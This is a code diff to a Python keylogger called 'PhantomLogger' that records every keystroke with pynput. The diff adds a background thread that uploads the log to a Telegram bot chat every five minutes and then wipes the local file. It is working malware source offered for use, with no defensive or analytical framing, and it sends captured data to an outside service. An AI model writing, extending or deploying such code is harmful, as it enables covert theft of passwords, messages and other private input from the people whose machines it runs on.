@@ -1,11 +1,18 @@
 from pynput.keyboard import Key, Listener
 import platform
 import os
+import asyncio
+import threading
+from telegram import Bot
 
 
 class PhantomLogger:
-    def __init__(self):
+    def __init__(self, bot_token=None, chat_id=None, send_interval=300):
         self.log_file = self._get_log_path()
+        self.bot_token = bot_token
+        self.chat_id = chat_id
+        self.send_interval = send_interval
+        self.telegram_enabled = bool(bot_token and chat_id)
     
     def _get_log_path(self):
         system = platform.system()
@@ -25,23 +32,66 @@ class PhantomLogger:
     
     def on_press(self, key):
         try:
-            # Handle alphanumeric keys
             key_data = key.char
         except AttributeError:
-            # Handle special keys (e.g., Key.space, Key.enter)
             key_data = str(key).replace("Key.", "")
             
         self._write_file(key_data)
+    
+    async def _send_log_to_telegram(self):
+        if not os.path.exists(self.log_file):
+            return
+        
+        try:
+            bot = Bot(token=self.bot_token)
+            
+            with open(self.log_file, 'rb') as file:
+                await bot.send_document(
+                    chat_id=self.chat_id,
+                    document=file,
+                    caption=f"Log file - {platform.system()}"
+                )
+            
+            # empty file after send
+            open(self.log_file, 'w').close()
+            
+        except Exception as e:
+            print(f"Errore invio Telegram: {e}")
+    
+    async def _telegram_scheduler(self):
+        while True:
+            await asyncio.sleep(self.send_interval)
+            await self._send_log_to_telegram()
+    
+    def _run_telegram_thread(self):
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(self._telegram_scheduler())
     
     def phantom_logger_manager(self):
         log_dir = os.path.dirname(self.log_file)
         if log_dir and not os.path.exists(log_dir):
             os.makedirs(log_dir, exist_ok=True)
 
+        if self.telegram_enabled:
+            telegram_thread = threading.Thread(
+                target=self._run_telegram_thread,
+                daemon=True
+            )
+            telegram_thread.start()
+
         with Listener(on_press=self.on_press) as listener:
             listener.join()
 
 
 if __name__ == "__main__":
-    logger = PhantomLogger()
+    BOT_TOKEN = 'your_bot_token_here'
+    CHAT_ID = 'your_chat_id_here'
+    
+    logger = PhantomLogger(
+        bot_token=BOT_TOKEN,
+        chat_id=CHAT_ID,
+        send_interval=300  # 5min
+    )
+    
     logger.phantom_logger_manager()
